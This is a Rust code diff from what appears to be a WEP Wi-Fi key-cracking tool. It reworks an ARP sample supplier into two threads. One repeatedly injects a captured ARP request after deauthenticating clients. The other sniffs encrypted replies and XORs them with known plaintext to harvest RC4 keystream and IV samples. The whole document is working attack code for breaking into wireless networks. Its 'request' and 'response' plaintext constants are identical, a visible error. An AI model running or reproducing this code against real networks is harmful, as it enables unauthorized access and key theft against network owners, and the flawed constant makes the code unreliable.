@@ -1,6 +1,10 @@
 use std::{
-    collections::VecDeque,
-    sync::atomic::{AtomicBool, Ordering},
+    rc::Rc,
+    sync::{
+        atomic::{AtomicBool, Ordering},
+        Arc,
+    },
+    thread::JoinHandle,
     time::{Duration, Instant},
 };
 
@@ -12,21 +16,22 @@ use ieee80211::{
     ManagementSubtype,
 };
 
-use crate::{ieee80211::IEEE80211PacketSniffer, keycracker::KeystreamSample, wep::WepIV};
+use crate::{
+    ieee80211::{IEEE80211Monitor, IEEE80211PacketSniffer},
+    keycracker::KeystreamSample,
+    wep::WepIV,
+};
 
 pub struct ARPSampleSupplier {
-    sniffer: IEEE80211PacketSniffer,
-    target_dev_mac: MacAddress,
-    arp_request: Frame<'static>,
+    replay_thread: Option<JoinHandle<()>>,
+    acceptor_thread: Option<JoinHandle<()>>,
 
-    sample_buf: VecDeque<KeystreamSample>,
+    should_exit: Arc<AtomicBool>,
+    sample_queue: Arc<concurrent_queue::ConcurrentQueue<KeystreamSample>>,
 }
 
 impl ARPSampleSupplier {
     const ARP_PACKET_SIZE: usize = 28;
-
-    const SAMPLE_BUF_SIZE: usize = 128;
-    const SAMPLE_TIMEOUT: Duration = Duration::from_millis(10);
 
     pub fn try_capture_arp_request(
         ap_mac: &MacAddress,
@@ -55,7 +60,7 @@ impl ARPSampleSupplier {
             .context("failed to inject deauth packet")?;
 
         //Sniff packets for an ARP-Request for a bit
-        const TIMEOUT: Duration = Duration::from_secs(5);
+        const TIMEOUT: Duration = Duration::from_secs(1);
 
         sniffer
             .set_timeout(Some(TIMEOUT))
@@ -88,12 +93,14 @@ impl ARPSampleSupplier {
             }
 
             //Check if this most likely is an ARP request
-            let Some(data) = data.next_layer() else {
-                continue;
-            };
-            let data = &data[..data.len() - 4]; //Last 4 bytes are garbage
+            let mut index = DataFrame::FRAGMENT_SEQUENCE_START + 2;
+            if matches!(data.subtype(), FrameSubtype::Data(DataSubtype::QoSData)) {
+                index += 2;
+            }
 
-            if data.len() == 8 + Self::ARP_PACKET_SIZE {
+            let data_len = data.bytes().len() - 8 - (index + 4); //Last 8 bytes are garbage (ICV + FCS)
+
+            if data_len == 8 + Self::ARP_PACKET_SIZE {
                 return Ok(Some(Frame::new(Vec::from(
                     &frame.bytes()[..frame.bytes().len() - 4],
                 ))));
@@ -104,92 +111,189 @@ impl ARPSampleSupplier {
     }
 
     pub fn new(
-        mut sniffer: IEEE80211PacketSniffer,
-        target_dev_mac: MacAddress,
+        monitor: Rc<IEEE80211Monitor>,
+        dev_mac: MacAddress,
+        ap_mac: MacAddress,
         arp_request: Frame<'static>,
     ) -> Self {
-        sniffer
-            .set_timeout(Some(Self::SAMPLE_TIMEOUT))
-            .expect("failed to set 802.11 sniffer timeout");
+        let sample_queue = Arc::new(concurrent_queue::ConcurrentQueue::unbounded());
+        let should_exit = Arc::new(AtomicBool::new(false));
+
+        //Launch the threads
+        let replay_thread = {
+            let sniffer = monitor
+                .create_sniffer()
+                .expect("failed to create sniffer for replay thread");
+
+            let should_exit = should_exit.clone();
+            Some(std::thread::spawn(move || {
+                Self::replay_thread_fnc(sniffer, arp_request, should_exit.as_ref())
+            }))
+        };
+
+        let acceptor_thread = {
+            let sniffer = monitor
+                .create_sniffer()
+                .expect("failed to create sniffer for acceptor thread");
+
+            let sample_queue = sample_queue.clone();
+            let should_exit = should_exit.clone();
+            Some(std::thread::spawn(move || {
+                Self::acceptor_thread(
+                    sniffer,
+                    sample_queue.as_ref(),
+                    ap_mac,
+                    dev_mac,
+                    should_exit.as_ref(),
+                )
+            }))
+        };
 
         ARPSampleSupplier {
-            sniffer,
-            target_dev_mac,
-            arp_request,
-            sample_buf: VecDeque::with_capacity(Self::SAMPLE_BUF_SIZE),
+            replay_thread,
+            acceptor_thread,
+
+            sample_queue,
+            should_exit,
+        }
+    }
+
+    fn replay_thread_fnc(
+        mut sniffer: IEEE80211PacketSniffer,
+        arp_request: Frame<'static>,
+        should_exit: &AtomicBool,
+    ) {
+        while !should_exit.load(Ordering::SeqCst) {
+            sniffer
+                .inject_frame(&arp_request)
+                .expect("failed to inject replayed ARP request");
+
+            std::thread::sleep(Duration::from_micros(3500));
+        }
+    }
+
+    fn acceptor_thread(
+        mut sniffer: IEEE80211PacketSniffer,
+        sample_queue: &concurrent_queue::ConcurrentQueue<KeystreamSample>,
+        ap_mac: MacAddress,
+        dev_mac: MacAddress,
+        should_exit: &AtomicBool,
+    ) {
+        while !should_exit.load(Ordering::SeqCst) {
+            //Receive a response packet
+            let packet = sniffer
+                .sniff_packet()
+                .expect("failed to sniff ARP response packet");
+
+            let Some(packet) = packet else {
+                continue;
+            };
+            let frame = packet.ieee80211_frame();
+
+            //Check if this is an encrypted response packet to our target device
+            let Some(FrameLayer::Data(data)) = frame.next_layer() else {
+                continue;
+            };
+
+            if !data.protected()
+                || !(data.transmitter_address() == Some(dev_mac)
+                    || data.transmitter_address() == Some(ap_mac)
+                    || data.destination_address() == Some(dev_mac))
+            {
+                continue;
+            }
+
+            //Get the IV from the packet
+            let mut index = DataFrame::FRAGMENT_SEQUENCE_START + 2;
+            if matches!(data.subtype(), FrameSubtype::Data(DataSubtype::QoSData)) {
+                index += 2;
+            }
+            let mut iv = WepIV::default();
+            iv.copy_from_slice(&data.bytes()[index..index + 3]);
+
+            let payload = &data.bytes()[index + 4..data.bytes().len() - 8]; //Last 8 bytes are garbage (ICV + FCS)
+
+            //Check if this most likely is an ARP response
+            if payload.len() == 8 + Self::ARP_PACKET_SIZE {
+                const ARP_REQ_PLAINTEXT: [u8; 16] = [
+                    0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06,
+                    0x04, 0x00, 0x02,
+                ];
+                const ARP_RESP_PLAINTEXT: [u8; 16] = [
+                    0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06,
+                    0x04, 0x00, 0x02,
+                ];
+
+                //Recover the keystream
+                let plaintext = if data.destination_address().unwrap().is_broadcast() {
+                    &ARP_REQ_PLAINTEXT
+                } else {
+                    &ARP_RESP_PLAINTEXT
+                };
+
+                let mut keystream = [0u8; KeystreamSample::KEYSTREAM_LEN];
+                for i in 0..16 {
+                    keystream[i] = payload[i] ^ plaintext[i];
+                }
+
+                //Put it into the queue
+                if sample_queue
+                    .push(KeystreamSample { keystream, iv })
+                    .is_err()
+                {
+                    panic!("failed to push sample to queue");
+                }
+            }
         }
     }
 
     pub fn provide_sample(&mut self, should_exit: &AtomicBool) -> Option<KeystreamSample> {
-        if self.sample_buf.is_empty() {
-            //Refill the sample buffer
-            while !should_exit.load(Ordering::SeqCst)
-                && self.sample_buf.len() < Self::SAMPLE_BUF_SIZE
-            {
-                //Replay a bunch of ARP requests
-                for _ in 0..Self::SAMPLE_BUF_SIZE {
-                    self.sniffer
-                        .inject_frame(&self.arp_request)
-                        .expect("failed to inject replayed ARP request");
+        const TIMEOUT: Duration = Duration::from_millis(10);
+
+        let replay_thread = self.replay_thread.as_ref().unwrap();
+        let acceptor_thread = self.acceptor_thread.as_ref().unwrap();
+
+        let start = Instant::now();
+        while !should_exit.load(Ordering::SeqCst) && start.elapsed() < TIMEOUT {
+            //Ensure neither thread has finished
+            if replay_thread.is_finished() {
+                if let Some(Err(e)) = self.replay_thread.take().map(JoinHandle::join) {
+                    std::panic::resume_unwind(e);
+                } else {
+                    panic!("replay thread exited prematurely");
                 }
+            }
 
-                //Sniff packets for a response for a bit
-                let start_time = Instant::now();
-                while start_time.elapsed() < Self::SAMPLE_TIMEOUT {
-                    //Receive a response packet
-                    let packet = self
-                        .sniffer
-                        .sniff_packet()
-                        .expect("failed to sniff ARP response packet");
-
-                    let Some(packet) = packet else {
-                        break;
-                    };
-                    let frame = packet.ieee80211_frame();
-
-                    //Check if this is an encrypted response packet to our target device
-                    let Some(FrameLayer::Data(data)) = frame.next_layer() else {
-                        continue;
-                    };
-
-                    if !data.protected() || data.destination_address() != Some(self.target_dev_mac)
-                    {
-                        continue;
-                    }
-
-                    //Get the IV from the packet
-                    let mut index = DataFrame::FRAGMENT_SEQUENCE_START + 2;
-                    if matches!(data.subtype(), FrameSubtype::Data(DataSubtype::QoSData)) {
-                        index += 2;
-                    }
-                    let mut iv = WepIV::default();
-                    iv.copy_from_slice(&data.bytes()[index..index + 3]);
-
-                    let Some(data) = data.next_layer() else {
-                        continue;
-                    };
-                    let data = &data[..data.len() - 4]; //Last 4 bytes are garbage
-
-                    //Check if this most likely is an ARP response
-                    if data.len() == 8 + Self::ARP_PACKET_SIZE {
-                        const ARP_RESPONSE_PLAINTEXT: [u8; 16] = [
-                            0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00,
-                            0x06, 0x04, 0x00, 0x02,
-                        ];
-
-                        //Recover the keystream
-                        let mut keystream = [0u8; KeystreamSample::KEYSTREAM_LEN];
-                        for i in 0..16 {
-                            keystream[i] = data[i] ^ ARP_RESPONSE_PLAINTEXT[i];
-                        }
-
-                        //Put it into the buffer
-                        self.sample_buf.push_back(KeystreamSample { keystream, iv });
-                    }
+            if acceptor_thread.is_finished() {
+                if let Some(Err(e)) = self.acceptor_thread.take().map(JoinHandle::join) {
+                    std::panic::resume_unwind(e);
+                } else {
+                    panic!("acceptor thread exited prematurely");
                 }
+            }
+
+            //Pop a sample from the queue
+            match self.sample_queue.pop() {
+                Ok(sample) => return Some(sample),
+                Err(concurrent_queue::PopError::Empty) => std::thread::yield_now(),
+                Err(e) => panic!("failed to pop sample from queue: {e}"),
             }
         }
 
-        return self.sample_buf.pop_front();
+        None
+    }
+}
+
+impl Drop for ARPSampleSupplier {
+    fn drop(&mut self) {
+        self.should_exit.store(true, Ordering::SeqCst);
+
+        if let Some(Err(e)) = self.replay_thread.take().map(JoinHandle::join) {
+            std::panic::resume_unwind(e);
+        }
+
+        if let Some(Err(e)) = self.acceptor_thread.take().map(JoinHandle::join) {
+            std::panic::resume_unwind(e);
+        }
     }
 }
